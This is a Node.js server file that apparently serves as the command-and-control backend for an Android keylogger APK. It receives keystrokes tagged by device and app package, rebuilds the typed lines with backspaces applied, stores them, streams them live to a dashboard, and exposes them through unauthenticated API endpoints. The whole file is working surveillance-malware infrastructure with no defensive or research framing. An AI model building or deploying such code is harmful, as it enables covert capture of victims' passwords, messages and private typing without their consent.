const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, 'logs.json');
const LINES_FILE = path.join(__dirname, 'lines.json');

const LINE_TIMEOUT = 2000; // 2 seconds inactivity flushes a line

// In-memory stores
let logs = [];
let lines = [];

// Per-device buffers for line reconstruction
let lineBuffers = new Map(); // device -> { package, keys: [], lastKeyTime, startTime }

// Load existing data
function loadFromFile(file, array) {
  if (fs.existsSync(file)) {
    try {
      const raw = fs.readFileSync(file, 'utf8');
      array.push(...raw.split('\n').filter(l => l.trim()).map(l => JSON.parse(l)));
    } catch (e) {
      console.error(`Failed to load ${file}:`, e.message);
    }
  }
}
loadFromFile(LOG_FILE, logs);
loadFromFile(LINES_FILE, lines);

function appendToFile(file, entry) {
  fs.appendFile(file, JSON.stringify(entry) + '\n', err => {
    if (err) console.error(`Failed to write ${file}:`, err.message);
  });
}

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Flush a device buffer into a reconstructed line
function flushLine(device, buf) {
  if (buf.keys.length === 0) return;

  let text = '';
  for (const key of buf.keys) {
    if (key === 'BACKSPACE') {
      text = text.slice(0, -1);
    } else if (key === 'ENTER') {
      text += '\n';
    } else if (key === '' || key === null || key === undefined) {
      // Treat empty key as space (some space events send empty string)
      text += ' ';
    } else {
      text += key;
    }
  }

  const lineEntry = {
    device,
    package: buf.package || 'unknown',
    text,
    startTime: new Date(buf.startTime).toISOString(),
    endTime: new Date(buf.lastKeyTime).toISOString(),
    keyCount: buf.keys.length
  };

  lines.push(lineEntry);
  appendToFile(LINES_FILE, lineEntry);
  io.emit('newLine', lineEntry);

  console.log('[+] New line:', JSON.stringify(lineEntry));
}

// Periodic check for stale buffers
setInterval(() => {
  const now = Date.now();
  for (const [device, buf] of lineBuffers.entries()) {
    if (now - buf.lastKeyTime > LINE_TIMEOUT) {
      flushLine(device, buf);
      lineBuffers.delete(device);
    }
  }
}, 500); // check every 0.5 second for faster flush

// POST /log - receive keypresses from APK (single object or array)
app.post('/log', (req, res) => {
  const entries = Array.isArray(req.body) ? req.body : [req.body];

  for (const body of entries) {
    const entry = {
      timestamp: new Date().toISOString(),
      ip: req.ip,
      body
    };
    logs.push(entry);
    appendToFile(LOG_FILE, entry);
    io.emit('newLog', entry);

    // Line buffering
    const { device, event, key, package: pkg } = body || {};
    if (device && event === 'keypress' && key !== undefined) {
      if (!lineBuffers.has(device)) {
        lineBuffers.set(device, {
          package: pkg || 'unknown',
          keys: [],
          lastKeyTime: Date.now(),
          startTime: Date.now()
        });
      }
      const buf = lineBuffers.get(device);
      buf.package = pkg || buf.package;
      buf.keys.push(key);
      buf.lastKeyTime = Date.now();
    }
  }

  res.status(200).json({ status: 'ok' });
});

// GET /api/logs
app.get('/api/logs', (req, res) => {
  const device = req.query.device;
  if (device) return res.json(logs.filter(l => l.body && l.body.device === device));
  res.json(logs);
});

// GET /api/lines
app.get('/api/lines', (req, res) => {
  const device = req.query.device;
  if (device) return res.json(lines.filter(l => l.device === device));
  res.json(lines);
});

// GET /api/devices
app.get('/api/devices', (req, res) => {
  const deviceSet = new Set();
  logs.forEach(l => { if (l.body && l.body.device) deviceSet.add(l.body.device); });
  lines.forEach(l => deviceSet.add(l.device));
  const devices = Array.from(deviceSet).map(d => ({
    device: d,
    logCount: logs.filter(l => l.body && l.body.device === d).length,
    lineCount: lines.filter(l => l.device === d).length
  }));
  res.json(devices);
});

// DELETE /api/all
app.delete('/api/all', (req, res) => {
  logs = [];
  lines = [];
  lineBuffers.clear();
  fs.writeFile(LOG_FILE, '', () => {});
  fs.writeFile(LINES_FILE, '', () => {});
  io.emit('logsCleared');
  res.status(200).json({ status: 'cleared' });
});

// Start server
server.listen(PORT, () => {
  console.log(`Log server running at http://localhost:${PORT}`);
  console.log('Endpoints:');
  console.log('  POST /log              - receive keypress (single or array)');
  console.log('  GET  /api/devices      - list devices');
  console.log('  GET  /api/logs         - raw logs');
  console.log('  GET  /api/lines        - reconstructed lines');
});
